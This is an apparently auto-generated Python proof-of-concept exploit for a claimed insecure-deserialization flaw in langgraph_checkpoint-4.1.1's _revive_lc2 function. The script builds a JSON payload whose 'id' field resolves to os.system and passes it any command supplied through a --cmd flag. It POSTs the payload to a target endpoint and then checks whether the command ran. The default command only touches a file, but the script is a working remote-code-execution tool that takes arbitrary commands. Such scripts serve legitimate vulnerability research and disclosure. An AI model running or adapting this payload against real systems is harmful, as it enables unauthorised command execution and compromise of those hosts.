#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint-4.1.1)
# Path: suspicious-010
# Sink: _revive_lc2
# Auto-generated — run with: python3 rce_specify_arbitrary_module_class__revive_lc2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

Vulnerability: Insecure deserialization in _revive_lc2 allows arbitrary module
import and class instantiation via attacker-controlled 'id' field.

Impact: Remote Code Execution (RCE) by instantiating classes with side effects
in __init__ or via constructor arguments.

Usage:
    python poc.py [--target http://localhost:8000] [--cmd "command"]

Default payload: touch /tmp/poc_success.txt (benign)
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

# Default target URL (adjust as needed)
DEFAULT_TARGET = "http://localhost:8000/api/v1/trigger"

# Benign default command to prove RCE
DEFAULT_CMD = "touch /tmp/poc_success.txt"


def build_payload(cmd: str) -> dict:
    """
    Build a malicious JSON payload that exploits the _revive_lc2 function.

    The payload uses the 'id' field to import the 'os' module and call
    os.system() with the attacker's command. Since the code only checks
    that id elements are basic types (str, int), not that the module/class
    is safe, we can specify ['os', 'system'] as the id.

    The args field contains the command to execute.
    """
    # The payload structure matches what _reviver expects:
    # {"lc": 2, "type": "constructor", "id": ["module", "class"], "args": [...]}
    payload = {
        "lc": 2,
        "type": "constructor",
        "id": ["os", "system"],  # Import os module, get system function
        "args": [cmd],           # Pass command as first argument
        "kwargs": None
    }
    return payload


def send_payload(target_url: str, payload: dict) -> bool:
    """
    Send the malicious payload to the target endpoint.

    Returns True if the request succeeded (status 200), False otherwise.
    """
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        target_url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode("utf-8")
            print(f"[+] Request succeeded (HTTP {response.status})")
            print(f"[+] Response body: {body[:200]}...")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP error: {e.code} - {e.reason}")
        print(f"[-] Response body: {e.read().decode('utf-8')[:200]}")
        return False
    except urllib.error.URLError as e:
        print(f"[-] Connection error: {e.reason}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


def verify_exploit(cmd: str) -> bool:
    """
    Verify that the exploit worked by checking if the command's effect is visible.

    For the default benign command (touch /tmp/poc_success.txt), we check if
    the file exists. For other commands, we print a note to manually verify.
    """
    if "touch" in cmd and "/tmp/poc_success.txt" in cmd:
        import os
        time.sleep(1)  # Give the system time to execute
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] Exploit verified: /tmp/poc_success.txt was created!")
            return True
        else:
            print("[-] Could not verify exploit - file not found")
            return False
    else:
        print("[*] Custom command used - please verify manually")
        return True


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_checkpoint-4.1.1 RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--cmd",
        default=DEFAULT_CMD,
        help=f"Command to execute (default: '{DEFAULT_CMD}')"
    )
    args = parser.parse_args()

    print("[*] Building malicious payload...")
    payload = build_payload(args.cmd)
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")

    print(f"[*] Sending payload to {args.target}...")
    success = send_payload(args.target, payload)

    if success:
        print("[*] Verifying exploit...")
        verify_exploit(args.cmd)
    else:
        print("[-] Exploit delivery failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
